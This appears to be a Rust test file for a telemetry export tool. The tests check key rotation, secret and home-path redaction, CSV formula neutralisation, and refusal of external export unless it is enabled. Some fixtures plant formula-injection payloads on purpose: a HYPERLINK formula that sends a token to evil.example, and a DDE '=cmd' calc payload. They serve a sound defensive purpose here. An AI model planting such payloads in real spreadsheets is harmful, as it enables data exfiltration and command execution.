    let fresh = p.json(&args)["manifest"]["page"]["next_cursor"].as_str().unwrap().to_owned();
    assert_ne!(fs::read_to_string(&key_path).unwrap(), key_hex, "a new key");
    assert!(p.fail(&refs(&with(&cursor))).contains("cursor_revoked"));
    assert_eq!(ids(&p.json(&refs(&with(&fresh)))), ["t2-a2", "t4-a1"]);
    // A loosened key is refused, never used.
    fs::set_permissions(&key_path, fs::Permissions::from_mode(0o644)).unwrap();
    assert!(p.fail(&refs(&with(&fresh))).contains("mode 600"));
}

/// Planted secrets, home paths and formula payloads in canonical identities
/// and agent kinds: exports carry none of the secrets or home paths, and no
/// CSV cell can start a formula.
#[test]
fn exports_redact_sentinels_and_neutralise_formulas() {
    let p = Planted::new();
    let db = p.db();
    let kind = "=HYPERLINK(\"https://evil.example/x?token=SENTINELSECRET05aaaa1111\") --api-key=SENTINELSECRET02aaaa1111 /home/alice/.codex Bearer SENTINELSECRET04aaaa1111";
    plant(&db, "=cmd|' /C calc'!A0", "failed", None, &[("sk-SENTINELSECRET03aaaa1111", "failed", &[("reserved", 1000), ("failed", 1100)])], None, None);
    plant(&db, "@SUM(1+1)", "failed", None, &[("a-at", "failed", &[("reserved", 1200), ("failed", 1300)])], None, None);
    plant(&db, "/home/alice/SENTINELSECRET06aaaa1111", "failed", None, &[("a-home", "failed", &[("reserved", 1400), ("failed", 1500)])], None, None);
    plant(&db, "ok", "succeeded", Some("verify_only"), &[("ok-a1", "completed", &[("reserved", 1600), ("completed", 1700)])], Some(("ok-a1", 1800)), None);
    for attempt in ["sk-SENTINELSECRET03aaaa1111", "a-at"] {
        let payload = json!({"inputs": {"version": 2, "effective_profile": {"kind": kind}}}).to_string();
        db.execute("INSERT INTO attempt_inputs(attempt_id,operation_id,payload,payload_hash) VALUES(?1,?1,?2,?3)", rusqlite::params![attempt, payload, hex(attempt)]).unwrap();
    }
    drop(db);
    // Hand-computed: T = all four tasks, A = {ok}: M02 = 1/4.
    let out = p.tmp.path().join("sentinel.json");
    p.raw(&["export", "--metric", "M02", "--by", "agent_kind", "--drill", "denominator", "--page-size", "500", "--out", out.to_str().unwrap()]);
    let json_text = fs::read_to_string(&out).unwrap();
    let csv_text = p.text(&["export", "--metric", "M02", "--by", "agent_kind", "--drill", "denominator", "--page-size", "500", "--format", "csv"]);
    let doc: Value = serde_json::from_str(&json_text).unwrap();
    assert_eq!((&doc["metrics"][0]["value"], &doc["records"]["total"]), (&json!("1/4"), &json!(4)));
    // The query itself (a local read) carries the raw kind; the export never does.
    assert!(p.text(&["query", "--json", "--metric", "M02", "--by", "agent_kind"]).contains("SENTINELSECRET02"));
    for text in [&json_text, &csv_text] {
        for needle in ["SENTINELSECRET", "/home/alice", "token=", p.tmp.path().to_str().unwrap()] {
            assert!(!text.contains(needle), "{needle} leaked: {text}");
        }
        assert!(text.contains("[redacted]") && text.contains("~/.codex"), "{text}");
    }
    // The excerpt of the planted kind (contracts §7 rules 2-4), and the identifiers.
    let excerpt = "=HYPERLINK(\"https://evil.example/x --api-key=[redacted] ~/.codex Bearer [redacted]";
    assert_eq!(doc["metrics"][0]["cells"].as_array().unwrap().iter().map(|c| c["dimension"]["agent_kind"].clone()).collect::<Vec<_>>(),
        [json!(excerpt), json!("unknown")]);
    // Sorted by canonical id before redaction; the home-path id loses its home and its token-like tail.
    assert_eq!(ids(&doc), ["~[redacted]", "=cmd|' /C calc'!A0", "@SUM(1+1)", "ok"]);
    // CSV: formula-leading cells carry a single-quote prefix; nothing starts a formula.
    let rows = csv_maps(&csv_text);
    let cell = rows.iter().find(|r| r["row_kind"] == "cell" && r["dimension_value"].starts_with('\'')).unwrap();
    assert_eq!(cell["dimension_value"], format!("'{excerpt}"));
    let records: Vec<&str> = rows.iter().filter(|r| r["row_kind"] == "record").map(|r| r["record_id"].as_str()).collect();
    assert_eq!(records, ["~[redacted]", "'=cmd|' /C calc'!A0", "'@SUM(1+1)", "ok"]);
    for r in &rows {
        for (col, v) in r {
            let numeral = v.strip_prefix('-').is_some_and(|n| !n.is_empty() && n.bytes().all(|b| b.is_ascii_digit() || b == b'.'));
            assert!(numeral || !v.starts_with(['=', '+', '-', '@', '\t', '\r']), "{col} starts a formula: {v}");
        }
    }
    let attrs: Value = serde_json::from_str(&rows.iter().find(|r| r["record_id"] == "'@SUM(1+1)").unwrap()["attrs"]).unwrap();
    assert_eq!((&attrs["agent_kind"], &attrs["disposition"]), (&json!(excerpt), &json!("failed")), "record attributes are redacted alike");
}

/// The external destination is an explicit deployment setting: refused
/// unless `telemetry-export.toml` enables it; local destinations only.
#[test]
fn external_export_is_disabled_by_default() {
    let p = Planted::new();
    worked_example(&p);
    let args = ["export", "--metric", "M02", "--external"];
    let err = p.fail(&args);
    assert!(err.contains("export rejected: {\"code\":\"external_export_disabled\",\"config\":\"telemetry-export.toml\""), "{err}");
    let config = p.config().join("telemetry-export.toml");
    fs::create_dir_all(p.config()).unwrap();
    let write = |text: &str| { let _ = fs::remove_file(&config); fs::write(&config, text).unwrap(); fs::set_permissions(&config, fs::Permissions::from_mode(0o600)).unwrap(); };
    let dir = p.tmp.path().join("outbox");
    fs::create_dir(&dir).unwrap();
    fs::set_permissions(&dir, fs::Permissions::from_mode(0o700)).unwrap();
    write(&format!("schema = \"telemetry-export-config.v1\"\n[external]\nenabled = false\ndestination = \"directory\"\ndirectory = \"{}\"\n", dir.display()));
    assert!(p.fail(&args).contains("external_export_disabled"));
    write("schema = \"telemetry-export-config.v1\"\n");
    assert!(p.fail(&args).contains("external_export_disabled"));
    write("schema = \"telemetry-export-config.v1\"\n[external]\nenabled = true\ndestination = \"https://collector.example\"\n");
    assert!(p.fail(&args).contains("unknown external export destination"), "no network destination");
    write("schema = \"telemetry-export-config.v1\"\n[external]\nenabled = true\ndestination = \"stdout\"\nurl = \"x\"\n");
    assert!(p.fail(&args).contains("unknown field"));
    assert_eq!(fs::read_dir(&dir).unwrap().count(), 0, "a refused export writes nothing");

    write(&format!("schema = \"telemetry-export-config.v1\"\n[external]\nenabled = true\ndestination = \"directory\"\ndirectory = \"{}\"\n", dir.display()));
    fs::set_permissions(&config, fs::Permissions::from_mode(0o666)).unwrap();
    assert!(p.fail(&args).contains("not group/world writable"));
    fs::set_permissions(&config, fs::Permissions::from_mode(0o600)).unwrap();
    let receipt = p.json(&args);
    let id = receipt["export_id"].as_str().unwrap().trim_start_matches("sha256:")[..16].to_owned();
    let file = dir.join(format!("demo-{id}-0.json"));
    let shipped: Value = serde_json::from_slice(&fs::read(&file).unwrap()).unwrap();
    assert_eq!((&shipped["manifest"]["external"], &shipped["metrics"][0]["value"]), (&json!({"destination": "directory"}), &json!("2/3")));
    assert_eq!(stable(&shipped["metrics"]), stable(&p.export(&["--metric", "M02"])["metrics"]), "the same page as a local export");
    assert!(p.fail(&args).contains("exists"), "never replaced");
    p.raw(&["export", "--metric", "M02", "--external", "--format", "csv"]);
    assert!(dir.join(format!("demo-{id}-0.csv.manifest.json")).exists());
    assert!(p.command_in("demo", &["export", "--metric", "M02", "--external", "--out", "x.json"]).stderr.starts_with(b"error: the argument"));

    write("schema = \"telemetry-export-config.v1\"\n[external]\nenabled = true\ndestination = \"stdout\"\n");
    let piped = p.export(&["--metric", "M02", "--external"]);
    assert_eq!((&piped["manifest"]["external"], &piped["metrics"][0]["numerator"]), (&json!({"destination": "stdout"}), &json!(2)));
}
